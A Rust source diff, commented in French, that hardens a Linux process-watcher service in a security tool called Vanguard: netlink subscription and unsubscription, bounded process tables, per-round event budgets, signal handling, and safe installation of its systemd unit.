@@ -307,17 +307,24 @@ fn lecture_de(pid: u32, exe: Option<String>, cmdline: Option<&[u8]>, status: Opt
 /// Au plus tant de processus connus (environ 1 Mio) : au-delà, les disparus sont balayés, puis les plus anciens
 /// oubliés. Un ordinateur de maison en a quelques centaines.
 const TABLE_MAX: usize = 16_384;
+/// Ce qui reste au plus après un balayage de la table pleine : 7/8. Le balayage suivant n'a lieu qu'après au moins
+/// TABLE_MAX/8 nouvelles fiches, même quand tous les processus vivent (une fork bomb) ; sinon chaque fourche coûterait
+/// un stat par fiche, 16 384, et le veilleur prendrait un retard sans fin.
+const TABLE_APRES_BALAYAGE: usize = TABLE_MAX / 8 * 7;
 /// Un nom de processus du noyau fait 15 octets ; on en garde 16 au plus, contre un nom fabriqué.
 const NOM_MAX: usize = 16;
 /// La lignée montrée : le programme et trois ancêtres au plus (« npm → node → sh »).
 const LIGNEE_MAX: usize = 4;
+/// Les parents remontés au plus pour reconnaître Vanguard : une lignée plus longue n'est pas de lui.
+const CHAINE_MAX: usize = 64;
 
 #[derive(Debug, Clone)]
 struct Fiche {
     parent: Option<u32>,
     nom: String,
-    /// Vanguard, ou lancé par lui : jamais jugé, comme au bilan.
-    de_vanguard: bool,
+    /// Vanguard lui-même (son programme, ou le veilleur) : une racine. La marque ne passe pas aux enfants : un
+    /// descendant est « de Vanguard » tant que la chaîne de ses parents connus mène à une racine encore là.
+    racine: bool,
     /// Son numéro d'entrée, pour que l'éviction des plus anciens ne retire pas une fiche reprise depuis.
     entree: u64,
 }
@@ -339,17 +346,9 @@ fn nom_borne(nom: &str) -> String {
 }
 
 impl Table {
-    fn inserer(&mut self, pid: u32, parent: Option<u32>, nom: &str, de_vanguard: bool, vivant: &dyn Fn(u32) -> bool) {
+    fn inserer(&mut self, pid: u32, parent: Option<u32>, nom: &str, racine: bool, vivant: &dyn Fn(u32) -> bool) {
         if !self.fiches.contains_key(&pid) && self.fiches.len() >= TABLE_MAX {
-            self.fiches.retain(|&p, _| vivant(p));
-            while self.fiches.len() >= TABLE_MAX {
-                let Some((p, entree)) = self.ordre.pop_front() else {
-                    break;
-                };
-                if self.fiches.get(&p).is_some_and(|f| f.entree == entree) {
-                    self.fiches.remove(&p);
-                }
-            }
+            self.faire_de_la_place(vivant);
         }
         self.entrees += 1;
         self.fiches.insert(
@@ -357,7 +356,7 @@ impl Table {
             Fiche {
                 parent,
                 nom: nom_borne(nom),
-                de_vanguard,
+                racine,
                 entree: self.entrees,
             },
         );
@@ -370,32 +369,56 @@ impl Table {
         }
     }
 
-    fn fourche(&mut self, parent: u32, enfant: u32, vivant: &dyn Fn(u32) -> bool) {
-        let (nom, de_vanguard) = self
-            .fiches
-            .get(&parent)
-            .map_or((String::new(), false), |f| (f.nom.clone(), f.de_vanguard));
-        self.inserer(enfant, Some(parent), &nom, de_vanguard, vivant);
+    /// La table est pleine : les disparus sont balayés, puis, si elle reste au-dessus de 7/8, les plus anciens sont
+    /// oubliés d'un coup jusqu'à 7/8. Les racines (Vanguard) passent leur tour ; elles ne sont oubliées qu'en dernier
+    /// recours, si la table n'était faite que d'elles.
+    fn faire_de_la_place(&mut self, vivant: &dyn Fn(u32) -> bool) {
+        self.fiches.retain(|&p, _| vivant(p));
+        let mut a_voir = self.ordre.len();
+        while self.fiches.len() > TABLE_APRES_BALAYAGE && a_voir > 0 {
+            a_voir -= 1;
+            let Some((p, entree)) = self.ordre.pop_front() else {
+                break;
+            };
+            match self.fiches.get(&p) {
+                Some(f) if f.entree == entree && f.racine => self.ordre.push_back((p, entree)),
+                Some(f) if f.entree == entree => {
+                    self.fiches.remove(&p);
+                }
+                _ => {}
+            }
+        }
+        while self.fiches.len() >= TABLE_MAX {
+            let Some((p, entree)) = self.ordre.pop_front() else {
+                break;
+            };
+            if self.fiches.get(&p).is_some_and(|f| f.entree == entree) {
+                self.fiches.remove(&p);
+            }
+        }
     }
 
-    /// Un lancement : le nom et le parent lus (s'ils l'ont été), et la marque de Vanguard si le programme est le sien.
-    fn lancement(&mut self, pid: u32, lu: Option<&EnMarche>, de_vanguard: bool, vivant: &dyn Fn(u32) -> bool) {
+    fn fourche(&mut self, parent: u32, enfant: u32, vivant: &dyn Fn(u32) -> bool) {
+        let nom = self.fiches.get(&parent).map(|f| f.nom.clone()).unwrap_or_default();
+        self.inserer(enfant, Some(parent), &nom, false, vivant);
+    }
+
+    /// Un lancement : le nom et le parent lus (s'ils l'ont été), et `racine` si le programme est celui de Vanguard.
+    /// Rien n'est repris de la marque d'avant : un processus qui lance autre chose que Vanguard n'est plus une racine.
+    fn lancement(&mut self, pid: u32, lu: Option<&EnMarche>, racine: bool, vivant: &dyn Fn(u32) -> bool) {
         let ancienne = self.fiches.get(&pid).cloned();
         let parent = lu.and_then(|p| p.parent).or(ancienne.as_ref().and_then(|f| f.parent));
         let nom = lu.map_or_else(
             || ancienne.as_ref().map(|f| f.nom.clone()).unwrap_or_default(),
             |p| p.nom.clone(),
         );
-        let de_vanguard = de_vanguard
-            || ancienne.as_ref().is_some_and(|f| f.de_vanguard)
-            || parent.is_some_and(|p| self.fiches.get(&p).is_some_and(|f| f.de_vanguard));
         match self.fiches.get_mut(&pid) {
             Some(f) => {
                 f.parent = parent;
                 f.nom = nom_borne(&nom);
-                f.de_vanguard = de_vanguard;
+                f.racine = racine;
             }
-            None => self.inserer(pid, parent, &nom, de_vanguard, vivant),
+            None => self.inserer(pid, parent, &nom, racine, vivant),
         }
     }
 
@@ -403,8 +426,26 @@ impl Table {
         self.fiches.remove(&pid);
     }
 
+    /// Vanguard, ou lancé par lui : la chaîne des parents connus mène à une racine encore là (`CHAINE_MAX` maillons
+    /// au plus, arrêtée sur une boucle). La fin d'un intermédiaire retire sa fiche et coupe la chaîne : le navigateur
+    /// ouvert par Vanguard (par xdg-open), rattaché ailleurs quand xdg-open se termine, est alors jugé, comme le
+    /// bilan le juge sur l'arbre du moment.
     fn de_vanguard(&self, pid: u32) -> bool {
-        self.fiches.get(&pid).is_some_and(|f| f.de_vanguard)
+        let mut vus = HashSet::new();
+        let mut courant = Some(pid);
+        while let Some(p) = courant
+            && vus.len() < CHAINE_MAX
+            && vus.insert(p)
+        {
+            let Some(f) = self.fiches.get(&p) else {
+                return false;
+            };
+            if f.racine {
+                return true;
+            }
+            courant = f.parent;
+        }
+        false
     }
 
     fn parent(&self, pid: u32) -> Option<u32> {
@@ -442,8 +483,13 @@ pub(crate) enum Refus {
     Absent,
     /// Le noyau refuse sans droits (EPERM).
     Interdit,
-    /// Aucun accusé de notre abonnement en 2 secondes.
+    /// Aucun accusé de notre abonnement en 2 secondes, sans débordement : le noyau ne nous a pas pris.
     SansAccuse,
+    /// Une cause passagère : l'accusé perdu dans un débordement du tampon, ou le noyau à court de mémoire (ENOMEM,
+    /// EAGAIN dans l'accusé). Relancer peut suffire.
+    Passager,
+    /// L'arrêt demandé (SIGTERM, SIGINT) pendant l'ouverture.
+    Arrete,
     Erreur(i32),
 }
 
@@ -465,6 +511,16 @@ impl Refus {
                 "The kernel did not confirm the subscription within 2 seconds (container, namespace?): nothing is installed. Whatever still arrived would come from another subscriber and does not count."
             )
             .to_string(),
+            Refus::Passager => tr!(
+                "Le noyau n'a pas pu confirmer l'abonnement, pour une cause passagère (son tampon a débordé, ou il manquait de mémoire) : rien n'est installé ; réessaie dans un instant.",
+                "The kernel could not confirm the subscription, for a passing cause (its buffer overflowed, or it was short of memory): nothing is installed; try again in a moment."
+            )
+            .to_string(),
+            Refus::Arrete => tr!(
+                "Arrêt demandé pendant l'ouverture du veilleur : rien n'est installé.",
+                "Stop requested while the watcher was opening: nothing is installed."
+            )
+            .to_string(),
             Refus::Erreur(e) => trf!(
                 "Le connecteur de processus ne s'ouvre pas ({}) : rien n'est installé.",
                 "The process connector does not open ({}): nothing is installed.",
@@ -482,6 +538,28 @@ impl Refus {
             e => Refus::Erreur(e),
         }
     }
+
+    /// La sortie du service sur ce refus. 77, que l'unité ne relance jamais, seulement quand relancer n'y changerait
+    /// rien (pas de connecteur, abonnement interdit, noyau qui ne nous prend pas) ; une cause passagère ou imprévue
+    /// sort en 1 pour que systemd relance (StartLimitBurst borne les relances) ; l'arrêt demandé sort en 0.
+    fn sortie(&self) -> i32 {
+        match self {
+            Refus::Absent | Refus::Interdit | Refus::SansAccuse => SORTIE_REFUS,
+            Refus::Passager | Refus::Erreur(_) => 1,
+            Refus::Arrete => 0,
+        }
+    }
+}
+
+/// Ce que dit l'erreur rendue par le noyau dans l'accusé de notre abonnement. ENOMEM et EAGAIN sont passagers
+/// (l'état de l'abonnement n'a pas pu être alloué) : jamais un refus définitif.
+fn resultat_de_l_accuse(err: u32) -> Result<(), Refus> {
+    match i32::try_from(err).unwrap_or(-1) {
+        0 => Ok(()),
+        libc::EPERM | libc::EACCES => Err(Refus::Interdit),
+        libc::ENOMEM | libc::EAGAIN | libc::ENOBUFS => Err(Refus::Passager),
+        e => Err(Refus::Erreur(e)),
+    }
 }
 
 fn errno() -> i32 {
@@ -497,6 +575,19 @@ impl Drop for Prise {
         unsafe {
             libc::close(self.0);
         }
+    }
+}
+
+/// La prise du connecteur, dès que la demande d'abonnement est partie : le désabonnement part quand elle disparaît,
+/// même si l'ouverture du veilleur échoue ensuite (accusé manquant, arrêt demandé). Sans lui, le noyau compterait un
+/// abonné de trop jusqu'au redémarrage (fermer la prise ne le décompte pas) et continuerait de préparer un message
+/// par fork, exec et fin du système. Un désabonnement que le noyau n'avait pas compté ne décompte rien : il tient
+/// l'état de l'abonnement par prise.
+struct Abonnement(Prise);
+
+impl Drop for Abonnement {
+    fn drop(&mut self) {
+        let _ = envoyer(&self.0, &demande_abonnement(PROC_CN_MCAST_IGNORE, jeton_d_abonnement()));
     }
 }
 
@@ -632,15 +723,32 @@ extern "C" fn sur_signal(_: libc::c_int) {
     ARRET.store(true, Ordering::SeqCst);
 }
 
-fn ecouter_les_signaux() {
-    // SAFETY : la structure est remplie de zéros puis complétée (gestionnaire, masque vide, aucun drapeau) ; le
+fn arret_demande() -> bool {
+    ARRET.load(Ordering::SeqCst)
+}
+
+/// Pose le gestionnaire de SIGTERM et SIGINT, et rend les actions d'avant (SIGTERM puis SIGINT) pour
+/// `remettre_les_signaux` : hors du service, Ctrl-C doit retrouver son effet après l'essai d'abonnement.
+fn ecouter_les_signaux() -> [libc::sigaction; 2] {
+    // SAFETY : les structures sont remplies de zéros (valides pour sigaction) puis complétées (gestionnaire, masque
+    // vide, aucun drapeau) ; sigaction écrit l'action d'avant dans `avant`, à nous et vivant pendant l'appel. Le
     // gestionnaire ne fait qu'écrire un booléen atomique, ce qui est sûr dans un signal.
     unsafe {
         let mut action: libc::sigaction = std::mem::zeroed();
         action.sa_sigaction = sur_signal as extern "C" fn(libc::c_int) as libc::sighandler_t;
         libc::sigemptyset(&raw mut action.sa_mask);
-        libc::sigaction(libc::SIGTERM, &raw const action, std::ptr::null_mut());
-        libc::sigaction(libc::SIGINT, &raw const action, std::ptr::null_mut());
+        let mut avant: [libc::sigaction; 2] = std::mem::zeroed();
+        libc::sigaction(libc::SIGTERM, &raw const action, &raw mut avant[0]);
+        libc::sigaction(libc::SIGINT, &raw const action, &raw mut avant[1]);
+        avant
+    }
+}
+
+fn remettre_les_signaux(avant: &[libc::sigaction; 2]) {
+    // SAFETY : les actions viennent de sigaction lui-même (`ecouter_les_signaux`) et sont lues pendant l'appel.
+    unsafe {
+        libc::sigaction(libc::SIGTERM, &raw const avant[0], std::ptr::null_mut());
+        libc::sigaction(libc::SIGINT, &raw const avant[1], std::ptr::null_mut());
     }
 }
 
@@ -669,40 +777,73 @@ fn notre_accuse(e: &EvenementProc, jeton: u32) -> Option<u32> {
     }
 }
 
-/// S'abonne et attend l'accusé, 2 secondes au plus.
-fn ouvrir_connecteur() -> Result<Prise, Refus> {
+/// Un jeton qui n'est pas déjà dans `deja`, pour une demande renvoyée.
+fn nouveau_jeton(deja: &[u32]) -> u32 {
+    let mut jeton = jeton_d_abonnement();
+    while deja.contains(&jeton) {
+        jeton = (jeton.wrapping_add(2) | 0x8000_0000).min(u32::MAX - 1);
+    }
+    jeton
+}
+
+/// Au plus tant de demandes d'abonnement, la première comprise, renvoyées après un débordement.
+const DEMANDES_MAX: usize = 4;
+
+/// S'abonne et attend l'accusé, 2 secondes au plus, même sous une rafale d'événements qui ne laisse jamais la file
+/// vide. Un débordement (ENOBUFS) a pu jeter notre accusé : la demande repart avec un nouveau jeton, et l'accusé de
+/// l'une ou l'autre compte (le noyau tient l'abonnement par prise : une demande de plus ne le compte pas deux fois) ;
+/// sans accusé après une perte, le refus est passager, jamais définitif. L'arrêt demandé se voit en 100 ms au plus.
+fn ouvrir_connecteur() -> Result<Abonnement, Refus> {
     let prise = ouvrir_prise(NETLINK_CONNECTOR, CN_IDX_PROC)?;
-    let jeton = jeton_d_abonnement();
-    if !envoyer(&prise, &demande_abonnement(PROC_CN_MCAST_LISTEN, jeton)) {
+    let mut jetons = vec![jeton_d_abonnement()];
+    if !envoyer(&prise, &demande_abonnement(PROC_CN_MCAST_LISTEN, jetons[0])) {
         return Err(Refus::depuis_errno(errno()));
     }
+    // La demande est partie : le désabonnement est dû, quoi qu'il arrive ensuite.
+    let abonnement = Abonnement(prise);
     let limite = Instant::now() + Duration::from_secs(2);
     let mut tampon = vec![0u8; 16 << 10];
-    while let Some(reste) = limite.checked_duration_since(Instant::now()) {
-        let ms = i32::try_from(reste.as_millis()).unwrap_or(2000).max(1);
-        if !attendre(&[&prise], ms)[0] {
+    let mut perte = false;
+    while let Some(reste) = limite.checked_duration_since(Instant::now())
+        && !arret_demande()
+    {
+        let ms = i32::try_from(reste.as_millis()).unwrap_or(100).clamp(1, 100);
+        if !attendre(&[&abonnement.0], ms)[0] {
             continue;
         }
-        loop {
-            match recevoir(&prise, &mut tampon) {
+        while Instant::now() < limite && !arret_demande() {
+            match recevoir(&abonnement.0, &mut tampon) {
                 Recu::Octets(n) => {
                     for e in lire_evenements_proc(&tampon[..n]) {
-                        if let Some(err) = notre_accuse(&e, jeton) {
-                            return match i32::try_from(err).unwrap_or(-1) {
-                                0 => Ok(prise),
-                                libc::EPERM | libc::EACCES => Err(Refus::Interdit),
-                                e => Err(Refus::Erreur(e)),
-                            };
+                        if let Some(err) = jetons.iter().find_map(|&j| notre_accuse(&e, j)) {
+                            return resultat_de_l_accuse(err).map(|()| abonnement);
                         }
                     }
                 }
-                Recu::Perdus => {}
+                Recu::Perdus => {
+                    perte = true;
+                    if jetons.len() < DEMANDES_MAX {
+                        let jeton = nouveau_jeton(&jetons);
+                        if envoyer(&abonnement.0, &demande_abonnement(PROC_CN_MCAST_LISTEN, jeton)) {
+                            jetons.push(jeton);
+                        }
+                    }
+                }
                 Recu::Vide => break,
                 Recu::Erreur(e) => return Err(Refus::Erreur(e)),
             }
         }
     }
-    Err(Refus::SansAccuse)
+    Err(refus_sans_accuse(arret_demande(), perte))
+}
+
+/// Le refus quand l'attente de l'accusé finit sans lui.
+fn refus_sans_accuse(arret: bool, perte: bool) -> Refus {
+    match (arret, perte) {
+        (true, _) => Refus::Arrete,
+        (false, true) => Refus::Passager,
+        (false, false) => Refus::SansAccuse,
+    }
 }
 
 // ───────────────────────────── Le veilleur ─────────────────────────────
@@ -734,7 +875,7 @@ pub(crate) struct Lance {
 }
 
 pub(crate) struct Veilleur {
-    connecteur: Prise,
+    connecteur: Abonnement,
     /// Les fins de prises, ou pourquoi elles ne s'écoutent pas : les lancements se voient quand même.
     prises: Result<Prise, Refus>,
     table: Table,
@@ -766,24 +907,68 @@ fn lire_proc(pid: u32) -> Lecture {
         let mut octets = Vec::new();
         f.take(CMDLINE_MAX).read_to_end(&mut octets).ok().map(|_| octets)
     });
-    let status = std::fs::read_to_string(racine.join("status")).ok();
+    let status = std::fs::read(racine.join("status")).ok().map(|o| status_lisible(&o));
     lecture_de(pid, exe, cmdline.as_deref(), status.as_deref())
 }
 
+/// Le texte de /proc/<pid>/status, lu en octets : le noyau y écrit le nom court tel quel (seuls \n et \\ sont
+/// échappés), et un seul octet qui n'est pas de l'UTF-8 ferait perdre tout le fichier, nom, parent et état compris.
+fn status_lisible(octets: &[u8]) -> String {
+    String::from_utf8_lossy(octets).into_owned()
+}
+
+/// Le budget d'un tour : au plus tant de messages par flux et tant de temps en tout. Au-delà, le tour rend la main
+/// même si la file n'est pas vide (le noyau garde le reste, ou le compte en débordement) : sous une rafale sans fin
+/// (une fork bomb, des exec en boucle), le service doit encore voir l'arrêt demandé, écrire son battement et ses
+/// pertes, lire les fins de prises, et ne garder en mémoire qu'un tour d'événements, dont 500 lectures de /proc par
+/// seconde au plus (`LECTURES_PAR_SECONDE`).
+const MESSAGES_PAR_TOUR: usize = 2048;
+const DUREE_DE_TOUR: Duration = Duration::from_millis(200);
+
+/// Lit les flux prêts (`pretes`) à tour de rôle, un message à la fois, pour qu'aucun n'affame l'autre : chacun
+/// jusqu'à ce qu'il soit vide ou ait lu `budget` messages, et tous jusqu'à ce que le tour ait duré `duree` ou que
+/// l'arrêt soit demandé. `lire(i)` lit un message du flux `i` et rend s'il y en avait un.
+fn a_tour_de_role(
+    pretes: &[bool],
+    budget: usize,
+    duree: Duration,
+    arret: &dyn Fn() -> bool,
+    mut lire: impl FnMut(usize) -> Result<bool, i32>,
+) -> Result<(), i32> {
+    let debut = Instant::now();
+    let mut restants: Vec<usize> = pretes.iter().map(|&p| if p { budget } else { 0 }).collect();
+    while restants.iter().any(|&r| r > 0) {
+        for (i, reste) in restants.iter_mut().enumerate() {
+            if *reste > 0 {
+                *reste = if lire(i)? { *reste - 1 } else { 0 };
+            }
+        }
+        if arret() || debut.elapsed() >= duree {
+            break;
+        }
+    }
+    Ok(())
+}
+
 impl Veilleur {
-    /// Ouvre les deux flux. La table part des programmes déjà en marche, Vanguard et ce qu'il a lancé reconnus.
+    /// Ouvre les deux flux. La table part des programmes déjà en marche ; les racines sont celles du bilan
+    /// (`chasse::de_vanguard`) : le programme de Vanguard et ce processus, jamais leurs ancêtres (systemd de
+    /// l'utilisateur, le terminal), dont tout ce qui est lancé serait sinon écarté. L'arrêt demandé pendant la
+    /// lecture de /proc, qui peut être longue sous charge, est vu avant de commencer.
     pub(crate) fn ouvrir() -> Result<Veilleur, Refus> {
         let connecteur = ouvrir_connecteur()?;
         let prises = ouvrir_prise(NETLINK_SOCK_DIAG, GROUPES_FINS_DE_PRISES);
         let mon_programme = mon_programme();
         let mut table = Table::default();
         if let Some((liste, _)) = chasse::en_marche() {
-            // Pas les ancêtres de Vanguard (systemd de l'utilisateur, le terminal) : tout ce qu'ils lancent
-            // serait sinon écarté.
-            let ecartes = chasse::de_vanguard(&liste, std::process::id(), mon_programme.as_deref());
+            let moi = std::process::id();
             for p in &liste {
-                table.inserer(p.pid, p.parent, &p.nom, ecartes.contains(&p.pid), &vivant);
+                let racine = p.pid == moi || (p.chemin.is_some() && p.chemin == mon_programme);
+                table.inserer(p.pid, p.parent, &p.nom, racine, &vivant);
             }
+        }
+        if arret_demande() {
+            return Err(Refus::Arrete);
         }
         Ok(Veilleur {
             connecteur,
@@ -798,59 +983,71 @@ impl Veilleur {
 
     /// La taille du tampon obtenue pour le connecteur.
     fn tampon(&self) -> usize {
-        tampon_obtenu(&self.connecteur)
+        tampon_obtenu(&self.connecteur.0)
     }
 
-    /// Un tour : attendre `attente` au plus, puis tout lire de ce qui est arrivé. `Err` : une erreur que le service
-    /// ne sait pas traiter (systemd le relance).
+    /// Un tour : attendre `attente` au plus, puis lire ce qui est arrivé, dans le budget d'un tour
+    /// (`MESSAGES_PAR_TOUR`, `DUREE_DE_TOUR`) : le reste attend le tour suivant. `Err` : une erreur que le service ne
+    /// sait pas traiter (systemd le relance).
     pub(crate) fn tour(&mut self, attente: Duration) -> Result<Vec<Vu>, i32> {
         let ms = i32::try_from(attente.as_millis()).unwrap_or(1000);
         let pretes = match &self.prises {
-            Ok(p) => attendre(&[&self.connecteur, p], ms),
-            Err(_) => attendre(&[&self.connecteur], ms),
+            Ok(p) => attendre(&[&self.connecteur.0, p], ms),
+            Err(_) => attendre(&[&self.connecteur.0], ms),
         };
         let mut vus = Vec::new();
-        if pretes[0] {
-            self.lire_le_connecteur(&mut vus)?;
-        }
-        if pretes.get(1).copied().unwrap_or(false)
-            && let Ok(prise) = &self.prises
-        {
-            loop {
-                match recevoir(prise, &mut self.tampon) {
-                    Recu::Octets(n) => vus.extend(lire_fins_de_prises(&self.tampon[..n]).into_iter().map(Vu::Prise)),
-                    Recu::Perdus => vus.push(Vu::Perdus(1)),
-                    Recu::Vide => break,
-                    Recu::Erreur(e) => return Err(e),
-                }
+        a_tour_de_role(&pretes, MESSAGES_PAR_TOUR, DUREE_DE_TOUR, &arret_demande, |i| {
+            if i == 0 {
+                self.lire_un_evenement(&mut vus)
+            } else {
+                self.lire_une_fin_de_prise(&mut vus)
             }
-        }
+        })?;
         Ok(vus)
     }
 
-    fn lire_le_connecteur(&mut self, vus: &mut Vec<Vu>) -> Result<(), i32> {
-        loop {
-            let n = match recevoir(&self.connecteur, &mut self.tampon) {
-                Recu::Octets(n) => n,
-                Recu::Perdus => {
-                    vus.push(Vu::Perdus(1));
-                    continue;
-                }
-                Recu::Vide => return Ok(()),
-                Recu::Erreur(e) => return Err(e),
-            };
-            for e in lire_evenements_proc(&self.tampon[..n]) {
-                match e {
-                    EvenementProc::Fourche { parent, enfant } => self.table.fourche(parent, enfant, &vivant),
-                    EvenementProc::Lancement { pid } => {
-                        if let Some(l) = self.lancement(pid) {
-                            vus.push(Vu::Lance(l));
-                        }
-                    }
-                    EvenementProc::Fin { pid, .. } => self.table.fin(pid),
-                    EvenementProc::Accuse { .. } | EvenementProc::Autre => {}
-                }
+    /// Un message du connecteur ; `false` : plus rien à lire.
+    fn lire_un_evenement(&mut self, vus: &mut Vec<Vu>) -> Result<bool, i32> {
+        let n = match recevoir(&self.connecteur.0, &mut self.tampon) {
+            Recu::Octets(n) => n,
+            Recu::Perdus => {
+                vus.push(Vu::Perdus(1));
+                return Ok(true);
             }
+            Recu::Vide => return Ok(false),
+            Recu::Erreur(e) => return Err(e),
+        };
+        for e in lire_evenements_proc(&self.tampon[..n]) {
+            match e {
+                EvenementProc::Fourche { parent, enfant } => self.table.fourche(parent, enfant, &vivant),
+                EvenementProc::Lancement { pid } => {
+                    if let Some(l) = self.lancement(pid) {
+                        vus.push(Vu::Lance(l));
+                    }
+                }
+                EvenementProc::Fin { pid, .. } => self.table.fin(pid),
+                EvenementProc::Accuse { .. } | EvenementProc::Autre => {}
+            }
+        }
+        Ok(true)
+    }
+
+    /// Un message des fins de prises ; `false` : plus rien à lire.
+    fn lire_une_fin_de_prise(&mut self, vus: &mut Vec<Vu>) -> Result<bool, i32> {
+        let Ok(prise) = &self.prises else {
+            return Ok(false);
+        };
+        match recevoir(prise, &mut self.tampon) {
+            Recu::Octets(n) => {
+                vus.extend(lire_fins_de_prises(&self.tampon[..n]).into_iter().map(Vu::Prise));
+                Ok(true)
+            }
+            Recu::Perdus => {
+                vus.push(Vu::Perdus(1));
+                Ok(true)
+            }
+            Recu::Vide => Ok(false),
+            Recu::Erreur(e) => Err(e),
         }
     }
 
@@ -884,16 +1081,6 @@ impl Veilleur {
             de_vanguard: self.table.de_vanguard(pid),
             lecture,
         })
-    }
-}
-
-impl Drop for Veilleur {
-    /// Le désabonnement : sans lui, le noyau compterait un abonné de trop et continuerait de préparer ses messages.
-    fn drop(&mut self) {
-        let _ = envoyer(
-            &self.connecteur,
-            &demande_abonnement(PROC_CN_MCAST_IGNORE, jeton_d_abonnement()),
-        );
     }
 }
 
@@ -971,8 +1158,8 @@ fn juger_prise(f: &FinPrise, serveurs: &ServeursDeCommande) -> Option<Alerte> {
         grave: true,
         genre: Genre::Botnet,
         titre: tr!(
-            "Vanguard : connexion brève vers un botnet",
-            "Vanguard: brief connection to a botnet"
+            "Vanguard : connexion fermée avec un serveur de botnet",
+            "Vanguard: closed connection with a botnet server"
         )
         .to_string(),
         texte: trf!(
@@ -1076,6 +1263,9 @@ pub(crate) struct Etat {
     pub battement: i64,
     pub lancements: u64,
     pub lus: u64,
+    /// Parmi les lus en entier, ceux d'un autre compte : la ligne de commande seule, leur programme ne se lisant pas
+    /// sans droits (le dossier d'où ils partent n'est donc pas jugé).
+    pub sans_programme: u64,
     pub noms_seuls: u64,
     pub partis: u64,
     pub non_lus: u64,
@@ -1142,7 +1332,8 @@ fn vivant_d_apres(etat: &Etat, maintenant: i64) -> bool {
 // ───────────────────────────── Le service ─────────────────────────────
 
 /// Le service, au premier plan, lancé par systemd (`vanguard veilleur --servir`). Rend la sortie : 0 à l'arrêt
-/// demandé, 1 sur une erreur inattendue (systemd le relance), 77 sur un refus (pas de relance).
+/// demandé, 1 sur une erreur inattendue ou passagère (systemd le relance), 77 sur un refus que relancer ne changerait
+/// pas (`Refus::sortie`).
 fn servir() -> i32 {
     let mut etat = Etat {
         pid: std::process::id(),
@@ -1171,11 +1362,19 @@ fn servir() -> i32 {
     {
         return refuser(&mut etat, noyau_trop_ancien(&r));
     }
+    // Avant l'ouverture : un arrêt pendant l'attente de l'accusé ou la lecture de /proc tuerait sinon le processus
+    // par l'action par défaut du signal, sans le désabonnement.
+    ecouter_les_signaux();
     let mut v = match Veilleur::ouvrir() {
         Ok(v) => v,
-        Err(refus) => return refuser(&mut etat, refus.raison()),
+        Err(refus) => {
+            let raison = refus.raison();
+            eprintln!("{raison}");
+            etat.raison_arret = Some(raison);
+            ecrire_etat(&etat);
+            return refus.sortie();
+        }
     };
-    ecouter_les_signaux();
     etat.tampon = v.tampon();
     etat.sans_prises = v.prises.as_ref().err().map(Refus::raison);
     etat.masque = super::dissimulation::proc_masque(&std::fs::read_to_string("/proc/self/mounts").unwrap_or_default());
@@ -1256,7 +1455,12 @@ fn traiter(vu: Vu, etat: &mut Etat, debit: &mut Debit, serveurs: &ServeursDeComm
         Vu::Lance(l) => {
             etat.lancements += 1;
             match &l.lecture {
-                Lecture::Complet(_) => etat.lus += 1,
+                Lecture::Complet(p) => {
+                    etat.lus += 1;
+                    if p.chemin.is_none() {
+                        etat.sans_programme += 1;
+                    }
+                }
                 Lecture::NomSeul(_) => etat.noms_seuls += 1,
                 Lecture::NonLu => etat.non_lus += 1,
                 Lecture::Parti => {
@@ -1372,9 +1576,19 @@ fn allumer() {
         trp!("  ✖ {}", "  ✖ {}", noyau_trop_ancien(&r));
         return;
     }
-    // L'essai sur le vrai noyau, 2 secondes au plus : ce qui ne s'ouvre pas ici ne s'ouvrira pas dans l'unité.
-    if let Err(refus) = Veilleur::ouvrir() {
+    // L'essai sur le vrai noyau, 2 secondes au plus : ce qui ne s'ouvre pas ici ne s'ouvrira pas dans l'unité. Un
+    // Ctrl-C pendant l'essai laisse partir le désabonnement ; l'action d'avant revient ensuite, pour la question.
+    ARRET.store(false, Ordering::SeqCst);
+    let avant = ecouter_les_signaux();
+    let essai = Veilleur::ouvrir().map(drop);
+    remettre_les_signaux(&avant);
+    let interrompu = ARRET.swap(false, Ordering::SeqCst);
+    if let Err(refus) = essai {
         trp!("  ✖ {}", "  ✖ {}", refus.raison());
+        return;
+    }
+    if interrompu {
+        trp!("  ✖ {}", "  ✖ {}", Refus::Arrete.raison());
         return;
     }
     if crate::machine::linux::natif::unite_activee(UNITE, true).is_none() {
@@ -1392,11 +1606,15 @@ fn allumer() {
         return;
     };
     let chemin = fichier_unite();
+    if let Err(raison) = place_libre(std::fs::read(&chemin)) {
+        trp!("  ✖ {}", "  ✖ {}", raison);
+        return;
+    }
     let texte = unite(&exe);
     afficher_aligne("  ", explication(), 2, "");
     println!();
     trp!(
-        "  Voici l'unité posée : {}",
+        "  Voici l'unité qui sera posée : {}",
         "  Here is the unit that will be set up: {}",
         crate::ui::chemin_affichable(&chemin)
     );
@@ -1422,6 +1640,11 @@ fn allumer() {
             "  ✖ The local copy of Vanguard could not be made ({}): nothing is set up.",
             crate::ui::affichable(&exe)
         );
+        return;
+    }
+    // Revu juste avant d'écrire : une unité étrangère posée pendant la question n'est pas écrasée non plus.
+    if let Err(raison) = place_libre(std::fs::read(&chemin)) {
+        trp!("  ✖ {}", "  ✖ {}", raison);
         return;
     }
     let ecrit =
@@ -1460,6 +1683,24 @@ fn allumer() {
     }
 }
 
+/// Peut-on écrire notre unité, d'après ce qui est à sa place (`std::fs::read`) ? Seulement si rien n'y est, ou si
+/// c'est déjà la nôtre : une unité du même nom posée par quelqu'un d'autre n'est jamais écrasée, puisque « off » ne
+/// pourrait pas la rendre. `Err` : pourquoi rien n'est posé.
+fn place_libre(existant: std::io::Result<Vec<u8>>) -> Result<(), String> {
+    match existant {
+        Ok(octets) if notre_unite(&String::from_utf8_lossy(&octets)) => Ok(()),
+        Ok(_) => Err(trf!(
+            "Une unité {UNITE} existe déjà et Vanguard ne l'a pas posée : rien n'est posé, elle reste telle quelle.",
+            "A {UNITE} unit already exists and Vanguard did not set it up: nothing is set up, it stays as it is."
+        )),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
+        Err(e) => Err(trf!(
+            "L'unité {UNITE} déjà en place ne se lit pas ({e}) : rien n'est posé.",
+            "The {UNITE} unit already in place cannot be read ({e}): nothing is set up."
+        )),
+    }
+}
+
 fn couper() {
     let chemin = fichier_unite();
     let texte = std::fs::read_to_string(&chemin).ok();
@@ -1474,18 +1715,18 @@ fn couper() {
     }
     let a_nous = texte.as_deref().is_some_and(notre_unite);
     trp!(
-        "  Le veilleur s'arrête (systemctl --user disable --now {UNITE}).",
-        "  The watcher stops (systemctl --user disable --now {UNITE})."
+        "  Le veilleur sera arrêté (systemctl --user disable --now {UNITE}).",
